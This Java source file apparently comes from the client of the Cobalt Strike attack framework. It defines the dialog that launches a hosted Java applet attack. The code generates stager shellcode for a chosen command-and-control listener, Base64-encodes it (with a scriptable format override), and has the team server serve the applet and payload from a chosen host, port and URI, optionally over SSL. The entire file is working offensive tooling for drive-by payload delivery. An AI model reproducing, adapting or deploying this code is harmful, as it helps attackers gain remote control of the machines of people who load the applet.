package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.GlobalDataManager;
import common.Callback;
import common.CommonUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import encoders.Base64;
import sleep.runtime.Scalar;
import sleep.runtime.SleepUtils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.util.HashMap;
import java.util.Stack;

public abstract class JavaAppletDialog implements DialogListener,
        Callback {
    protected JFrame dialog = null;
    protected AggressorClient client;
    protected String host;
    protected String port;
    protected String uri;
    protected String listener;
    protected String proto;
    protected boolean ssl;

    public JavaAppletDialog(AggressorClient client) {
        this.client = client;
    }

    @Override
    public void dialogAction(ActionEvent event, HashMap<String, Object> options) {
        this.uri = DialogUtils.string(options, "uri");
        this.host = DialogUtils.string(options, "host");
        this.port = DialogUtils.string(options, "port");
        this.listener = DialogUtils.string(options, "listener");
        this.ssl = DialogUtils.bool(options, "ssl");
        this.proto = this.ssl ? "https://" : "http://";
        byte[] applet = CommonUtils.readResource(this.getResourceName());
        byte[] stager = DataUtils.shellcode(GlobalDataManager.getGlobalDataManager(), this.listener);
        String b64stager = this.formatShellcode(stager);
        this.client.getConnection().call("cloudstrike.host_applet", CommonUtils.args(this.host, Integer.parseInt(this.port), this.ssl, this.uri, applet, b64stager, this.getMainClass(), this.getShortDescription()), this);
    }

    public abstract String getResourceName();

    public abstract String getMainClass();

    public abstract String getShortDescription();

    public abstract String getTitle();

    public abstract String getURL();

    public abstract String getDescription();

    public abstract String getDefaultURL();

    public String formatShellcode(byte[] stager) {
        Stack<Scalar> temp = new Stack<>();
        temp.push(SleepUtils.getScalar(stager));
        String override = this.client.getScriptEngine().format("APPLET_SHELLCODE_FORMAT", temp);
        if (override != null) {
            return override;
        }
        return Base64.encode(stager);
    }

    @Override
    public void result(String method, Object data) {
        String status = data + "";
        if ("success".equals(status)) {
            DialogUtils.startedWebService("host applet", this.proto + this.host + ":" + this.port + this.uri);
        } else {
            DialogUtils.showError("Unable to start web server:\n" + status);
        }
    }

    public void show() {
        this.dialog = DialogUtils.dialog(this.getTitle(), 640, 480);
        DialogManager controller = new DialogManager(this.dialog);
        controller.addDialogListener(this);
        controller.set("uri", this.getDefaultURL());
        controller.set("port", "80");
        controller.set("host", DataUtils.getLocalIP(this.client.getData()));
        controller.text("uri", "Local URI:", 20);
        controller.text("host", "Local Host:", 20);
        controller.text("port", "Local Port:", 20);
        controller.listener("listener", "Listener:", this.client.getConnection(), this.client.getData());
        controller.checkbox_add("ssl", "SSL:", "Enable SSL", DataUtils.hasValidSSL(this.client.getData()));
        JButton ok = controller.action("Launch");
        JButton help = controller.help(this.getURL());
        this.dialog.add(DialogUtils.description(this.getDescription()), "North");
        this.dialog.add(controller.layout(), "Center");
        this.dialog.add(DialogUtils.center(ok, help), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}

